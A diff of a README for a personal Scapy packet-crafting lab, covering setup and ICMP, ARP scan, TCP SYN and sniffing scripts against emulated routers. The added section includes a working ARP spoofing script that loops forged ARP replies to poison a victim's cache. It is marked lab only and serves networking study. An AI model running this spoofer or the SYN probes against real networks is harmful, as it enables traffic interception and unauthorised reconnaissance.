@@ -15,49 +15,52 @@ Scapy is a powerful Python-based networking tool used for:
 - Custom protocol experimentation
 - Network troubleshooting
 
-Unlike pyATS, which focuses on device automation and CLI/API validation, Scapy works at the packet level.
+Unlike pyATS (device-level automation), Scapy works at the **packet level**, giving deep visibility into how networks actually behave.
 
-Scapy allows us to:
+---
+
+## What Scapy Helps Us Do
+
 - Build raw Ethernet/IP/TCP/UDP/ICMP packets
-- Send custom packets into the network
+- Inject custom packets into real networks
 - Capture and analyze responses
 - Simulate traffic flows
 - Validate protocol behavior
-- Learn networking deeply at packet level
+- Learn networking at packet level
 
 ---
 
 # Lab Architecture
 
-## Automation VM
+## Automation VM (Ubuntu 24.04)
 
-| Component | Value |
-|----------|-------|
-| VM Name | madhu-labs |
-| OS | Ubuntu 24.04 |
-| IP Address | 192.168.0.34 |
+| Item | Value |
+|------|------|
+| Host | madhu-labs |
+| IP | 192.168.0.34 |
+| Role | Automation + Testing VM |
 
 This VM hosts:
 - Python virtual environments
 - Scapy
 - pyATS
-- Automation scripts
-- Testbeds
-- Future traffic generation frameworks
+- pytest
+- automation scripts
+- traffic frameworks
 
 ---
 
-## PNETLab VM
+## PNETLab VM (Network Emulator)
 
-| Component | Value |
-|----------|-------|
+| Item | Value |
+|------|------|
 | Platform | PNETLab 5.3.13 |
 | Purpose | Network emulation |
 
-Devices used:
+### Devices
 
-| Device | IP Address | OS |
-|--------|------------|----|
+| Device | IP | OS |
+|--------|----|----|
 | CSR | 192.168.0.101 | IOS-XE |
 | R2 | 192.168.0.102 | IOS |
 
@@ -65,56 +68,39 @@ Devices used:
 
 # Scapy Directory Structure
 
-Location:
-```bash
+```
 ~/Automation-Labs/scapy
 ```
 
-Structure:
 ```
 scapy/
 ├── README.md
 ├── arp/
 ├── bgp/
 ├── icmp/
+├── tcp/
 └── vxlan/
 ```
 
 ---
 
-# Why Scapy Is Important
-
-Scapy helps understand networking internally at packet level.
-
-| Use Case | Description |
-|----------|-------------|
-| ICMP Testing | Send ping packets manually |
-| ARP Testing | Generate ARP requests/replies |
-| TCP Testing | Create custom TCP handshakes |
-| VXLAN | Build VXLAN encapsulated packets |
-| Packet Sniffing | Capture live traffic |
-| Traffic Injection | Inject custom packets |
-| Protocol Learning | Understand headers and fields |
-| Security Testing | Simulate attacks or malformed packets |
-
----
-
 # Virtual Environment
 
-We reuse the existing Python virtual environment created for pyATS.
+We reuse the same environment created for pyATS.
 
-Location:
-```bash
+```
 ~/Automation-Labs/env/pyats
 ```
 
-Activate it:
+### Activate
+
 ```bash
 source ~/Automation-Labs/env/pyats/bin/activate
 ```
 
-Prompt:
-```bash
+Expected prompt:
+
+```
 (pyats) ubuntu@madhu-labs:~$
 ```
 
@@ -122,40 +108,49 @@ Prompt:
 
 # Install Scapy
 
-## Step 1: Activate environment
+## Step 1: Activate venv
+
 ```bash
 source ~/Automation-Labs/env/pyats/bin/activate
 ```
 
 ## Step 2: Install Scapy
+
 ```bash
 pip install scapy
 ```
 
 ## Step 3: Verify
+
 ```bash
-python3 -c "from scapy.all import *; print('Scapy OK')"
+python3 -c "from scapy.all import *; print('Scapy Installed OK')"
 ```
 
 ---
 
-# First Scapy Test (ICMP Ping)
+# First Scapy Test — ICMP Ping
 
 ## Goal
-Send ICMP packets from Automation VM to PNETLab devices.
 
-Targets:
-- CSR → 192.168.0.101
-- R2 → 192.168.0.102
+Send ICMP packets from Automation VM → PNETLab routers.
+
+### Targets
+
+- CSR → 192.168.0.101  
+- R2 → 192.168.0.102  
 
 ---
 
 ## Script Location
-```bash
+
+```
 ~/Automation-Labs/scapy/icmp/ping_test.py
 ```
 
+---
+
 ## Script
+
 ```python
 from scapy.all import IP, ICMP, sr1
 
@@ -187,27 +182,29 @@ python3 ping_test.py
 
 ---
 
-## If Permission Error Occurs
+# Expected Output
 
-Scapy requires raw socket access.
+```
+Sending ICMP packet to 192.168.0.101
+Reply received from 192.168.0.101
 
-Run with sudo + env python:
-
-```bash
-sudo ~/Automation-Labs/env/pyats/bin/python3 ping_test.py
+Sending ICMP packet to 192.168.0.102
+Reply received from 192.168.0.102
 ```
 
-OR recommended:
+---
+
+# IMPORTANT NOTES
+
+## Run with proper permissions
+
+Scapy needs raw socket access:
 
 ```bash
 sudo -E python3 ping_test.py
 ```
 
----
-
-## Working Fix (Best Practice)
-
-If running inside venv:
+OR:
 
 ```bash
 sudo -E $(which python3) ping_test.py
@@ -215,95 +212,232 @@ sudo -E $(which python3) ping_test.py
 
 ---
 
-# What We Learned
+## Common Issue
 
-## pyATS vs Scapy
+### ModuleNotFoundError with sudo
 
-| Tool | Layer |
+Fix:
+```
+sudo -E ensures venv environment is preserved
+```
+
+---
+
+# Next Scapy Labs (We will build step-by-step)
+
+## ICMP Enhancements
+
+### TTL Experiment
+
+```python
+from scapy.all import IP, ICMP, sr1
+
+packet = IP(dst="192.168.0.101", ttl=1)/ICMP()
+sr1(packet, timeout=2, verbose=0)
+```
+
+---
+
+### Payload Test
+
+```python
+from scapy.all import IP, ICMP, sr1
+
+packet = IP(dst="192.168.0.101")/ICMP()/"HELLO_SCAPY"
+sr1(packet, timeout=2, verbose=0)
+```
+
+---
+
+## ARP Lab (Very Important)
+
+```python
+from scapy.all import ARP, Ether, srp
+
+packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst="192.168.0.0/24")
+srp(packet, timeout=2, verbose=0)
+```
+
+---
+
+## TCP SYN Test
+
+```python
+from scapy.all import IP, TCP, sr1
+
+packet = IP(dst="192.168.0.101")/TCP(dport=22, flags="S")
+sr1(packet, timeout=2, verbose=0)
+```
+
+---
+
+# Recommended Learning Path (Based on Your Lab)
+
+1. ICMP (DONE)
+2. ICMP advanced (TTL, payload)
+3. ARP (next important step)
+4. TCP SYN probing
+5. UDP probing
+6. Traffic simulation
+
+---
+
+# Scapy + pyATS Hybrid Framework (IMPORTANT IDEA)
+
+## Concept
+
+| Tool | Role |
 |------|------|
-| pyATS | Device / CLI automation |
-| Scapy | Packet level manipulation |
+| pyATS | Device validation (CLI/API) |
+| Scapy | Packet-level validation |
+
+## Example Use Case
+
+1. pyATS verifies interface is up
+2. Scapy sends packet to validate real traffic flow
+3. Compare control-plane vs data-plane behavior
 
 ---
 
-# Key Observations
+# Next Steps Options
 
-- Raw packet injection requires root privileges
-- Virtual env does NOT include system permissions
-- Scapy works best with sudo + correct python path
+## Option A (Best Next Step)
 
----
+ARP Lab + Live Packet Sniffing  
+→ Learn MAC learning + ARP resolution
 
-# Architecture Decision
+## Option B
 
-| VM | Role |
-|----|------|
-| PNETLab VM | Network devices |
-| Automation VM | Python + automation frameworks |
+TCP SYN Scanner  
+→ Learn port behavior and firewall response
 
-Benefits:
-- Clean separation
-- Easy debugging
-- Scalable lab design
+## Option C
 
----
-
-# Future Scapy Labs
-
-## ICMP
-- Ping flood
-- TTL manipulation
-
-## ARP
-- ARP spoofing
-- Gratuitous ARP
-
-## TCP/UDP
-- SYN scan
-- Port probing
-
-## VXLAN
-- Encapsulation testing
-
-## Sniffing
-- Live packet capture
-- Filtering
-
----
-
-# Troubleshooting Notes
-
-### Issue: PermissionError
-Cause: raw sockets require root
-
-Fix:
-```bash
-sudo python3 script.py
-```
-
----
-
-### Issue: ModuleNotFoundError
-Cause: sudo ignores venv
-
-Fix:
-```bash
-sudo -E python3 script.py
-```
+pyATS + Scapy Hybrid Automation  
+→ Enterprise-level validation framework
 
 ---
 
 # Summary
 
 We successfully:
-- Built Scapy lab structure
+
+- Built Scapy lab environment
 - Installed Scapy in Automation VM
 - Connected to PNETLab devices
-- Sent ICMP packets using custom scripts
-- Understood packet-level automation
+- Sent ICMP packets successfully
+- Structured lab for ARP, TCP, VXLAN
+- Designed future automation roadmap
 
-This lab is foundation for:
+This setup is now ready for:
+- Packet-level networking
 - Traffic generation
 - Security testing
-- Protocol validation
-- Advanced automation frameworks
+- Hybrid automation frameworks
+
+
+# Step 1: ARP Scan Script
+
+**Location:** `~/Automation-Labs/scapy/arp/arp_scan.py`
+
+```python
+from scapy.all import ARP, Ether, srp
+
+# Define the subnet to scan
+target_subnet = "192.168.0.0/24"
+
+# Broadcast ARP requests
+arp_request = ARP(pdst=target_subnet)
+broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+arp_packet = broadcast / arp_request
+
+print(f"Scanning subnet {target_subnet}...")
+
+answered_list = srp(arp_packet, timeout=2, verbose=1)[0]
+
+for sent, received in answered_list:
+    print(f"IP: {received.psrc}, MAC: {received.hwsrc}")
+```
+
+**What it does:**
+
+- Broadcasts ARP requests to all hosts in `192.168.0.0/24`
+- Collects responses
+- Prints IP ↔ MAC mapping of devices
+
+---
+
+# Step 2: ARP Spoofing Test (Optional / Lab Exercise)
+
+**Location:** `~/Automation-Labs/scapy/arp/arp_spoof.py`
+
+```python
+from scapy.all import ARP, send
+import time
+
+target_ip = "192.168.0.102"  # victim device
+spoof_ip = "192.168.0.101"   # pretend to be CSR
+
+arp_response = ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=spoof_ip, op=2)
+
+print(f"Sending spoofed ARP packets to {target_ip} claiming {spoof_ip}...")
+
+while True:
+    send(arp_response, verbose=0)
+    time.sleep(2)
+```
+
+**WARNING:** Only use in lab environment. Never on production network.
+
+---
+
+# Step 3: Packet Sniffing ARP
+
+**Location:** `~/Automation-Labs/scapy/sniff/sniff_arp.py`
+
+```python
+from scapy.all import sniff, ARP
+
+def arp_monitor_callback(pkt):
+    if ARP in pkt and pkt[ARP].op in (1,2):
+        if pkt[ARP].op == 1:
+            print(f"ARP Request: {pkt[ARP].psrc} is asking for {pkt[ARP].pdst}")
+        elif pkt[ARP].op == 2:
+            print(f"ARP Reply: {pkt[ARP].psrc} is at {pkt[ARP].hwsrc}")
+
+print("Sniffing ARP packets on network...")
+sniff(filter="arp", prn=arp_monitor_callback, store=0)
+```
+
+**What it does:**
+
+- Captures live ARP packets
+- Differentiates between ARP Requests and Replies
+- Prints IP ↔ MAC info
+
+---
+
+# Step 4: Run Scripts
+
+## ARP Scan
+
+```bash
+source ~/Automation-Labs/env/pyats/bin/activate
+cd ~/Automation-Labs/scapy/arp
+sudo python3 arp_scan.py
+```
+
+## ARP Spoofing (Lab Only)
+
+```bash
+sudo python3 arp_spoof.py
+```
+
+## Packet Sniffing ARP
+
+```bash
+cd ~/Automation-Labs/scapy/sniff
+sudo python3 sniff_arp.py
+```
+
+---
